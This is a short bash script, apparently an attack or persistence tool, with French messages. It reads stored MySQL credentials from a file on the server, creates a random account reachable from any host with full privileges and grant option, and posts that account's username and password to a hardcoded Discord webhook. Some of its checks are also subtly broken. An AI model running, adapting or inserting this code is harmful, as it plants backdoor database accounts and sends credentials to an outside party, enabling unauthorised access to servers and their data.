#!/bin/bash

username=$(cat /dev/urandom | tr -dc 'a-zA' | fold -w 10 | head -n 1)
password=$username

#mysql_user="maki"
#mysql_mdp="maki"

check_db(){
    user=$1
    mdp=$2
    check=$(mysqladmin -u${user} -p${mdp} processlist >> /dev/null)
    if [[ $check -eq 0 ]]
    then
        echo 1
    else
        echo 0
    fi
}

total_line_file=$(cat /opt/.credentialsmysql | wc -l)
((total_line_file++))
i=1
#value=$(check_db $mysql_user $mysql_mdp >> /dev/null)
value=1
#echo $value
while [[ "$value" -eq 1 ]]
do
    ligne=$(sed -n $i"p" < /opt/.credentialsmysql)
    mysql_user=$(echo $ligne | cut -f1 -d " ")
    mysql_mdp=$(echo $ligne | cut -f2 -d " ")
    ((i++))
    if [[ $i -gt $total_line_file ]]
    then
        curl -H "Content-Type: application/json" -d '{"username": "WARNING", "content": "Aucun Username et Password dans le fichier et le root fonctionne, réussite de leur côté, MYSQL protégé."}' "https://discord.com/api/webhooks/1042025868870041611/g6X0JMVn9SfUkT3NWX_bhJvXRR7XDF-0n0l4jbLPhZ74jFX-KMrcGMno8o9jxqFM8v7J"
        exit
    else
       value=$(check_db $mysql_user $mysql_mdp >> /dev/null)
    fi
done


mysql -u${mysql_user} -p${mysql_mdp} -e "CREATE USER '$username'@'%' IDENTIFIED BY '$password';"
mysql -u${mysql_user} -p${mysql_mdp}  -e "GRANT ALL PRIVILEGES ON *.* TO '$username'@'%' WITH GRANT OPTION;"

curl -H "Content-Type: application/json" -d '{"username": "Compte MySQL '"${username}"'", "content": "username = '"${username}"' \npassword = '"${password}"'"}' "https://discord.com/api/webhooks/1042025868870041611/g6X0JMVn9SfUkT3NWX_bhJvXRR7XDF-0n0l4jbLPhZ74jFX-KMrcGMno8o9jxqFM8v7J"

echo "$username $password" >> /opt/.credentialsmysql